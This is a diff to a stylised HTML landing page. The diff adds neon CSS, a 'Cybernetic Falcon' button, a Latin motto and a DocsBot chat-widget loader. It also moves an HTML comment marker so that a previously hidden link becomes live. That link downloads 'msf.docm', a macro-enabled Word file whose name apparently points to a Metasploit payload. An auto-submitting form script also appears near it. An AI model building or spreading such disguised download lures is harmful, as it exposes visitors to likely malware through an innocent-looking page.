@@ -1,5 +1,73 @@
-<html>
+<html><head>
+  <meta charset="UTF-8">
+  <title>Cybernetic Falcon</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background: radial-gradient(ellipse at center, #0b0b0b, #000);
+      font-family: 'Orbitron', sans-serif;
+      color: #ccc;
+      text-align: center;
+    }
+
+    button {
+      padding: 1rem 2.5rem;
+      font-size: 1.2rem;
+      text-transform: uppercase;
+      border: none;
+      border-radius: 1rem;
+      background: linear-gradient(135deg, #00fff7, #9400ff);
+      color: #000;
+      cursor: pointer;
+      box-shadow: 0 0 15px #00fff7, 0 0 25px #9400ff;
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
+      position: relative;
+      overflow: hidden;
+    }
+
+    button::after {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background: conic-gradient(from 0deg, transparent, #ff2f92, transparent);
+      animation: spin 6s linear infinite;
+      opacity: 0.15;
+      z-index: 0;
+    }
+
+    button:hover {
+      transform: scale(1.05);
+      box-shadow: 0 0 30px #00fff7, 0 0 60px #9400ff;
+    }
+
+    .quote {
+      margin-top: 1.5rem;
+      font-style: italic;
+      color: #aaa;
+    }
+
+    .quote span {
+      color: #ff2f92;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+  </style>
+  </head>
   <body>
+    <button aria-label="Cybernetic Falcon Action">Cybernetic Falcon</button>
+    <div class="quote">
+      <span>Turbulentiam amplectere, supra vola</span><br>
+      <small>— Embrace the turbulence, rise beyond.</small>
+    </div>
     <h1>Hola!</h1>
     <p>S33, H3r3 w3 h4v3 4 B0t. Try it n0w.</p>
     <script type="text/javascript">window.DocsBotAI=window.DocsBotAI||{},DocsBotAI.init=function(e){return new Promise((t,r)=>{var n=document.createElement("script");n.type="text/javascript",n.async=!0,n.src="https://widget.docsbot.ai/chat.js";let o=document.getElementsByTagName("script")[0];o.parentNode.insertBefore(n,o),n.addEventListener("load",()=>{let n;Promise.all([new Promise((t,r)=>{window.DocsBotAI.mount(Object.assign({}, e)).then(t).catch(r)}),(n=function e(t){return new Promise(e=>{if(document.querySelector(t))return e(document.querySelector(t));let r=new MutationObserver(n=>{if(document.querySelector(t))return e(document.querySelector(t)),r.disconnect()});r.observe(document.body,{childList:!0,subtree:!0})})})("#docsbotai-root"),]).then(()=>t()).catch(r)}),n.addEventListener("error",e=>{r(e.message)})})};</script>
@@ -12,14 +80,15 @@
     <script>
       document.forms[0].submit();
     </script>
+-->
 
-
+    
     <hr>
     <p>
       <a href="https://github.com/RafalW3bCraft/tester/raw/main/msf.docm" download="msf.docm">
         Click here to download msf.docm
       </a>
     </p>
--->
+
   </body>
 </html>
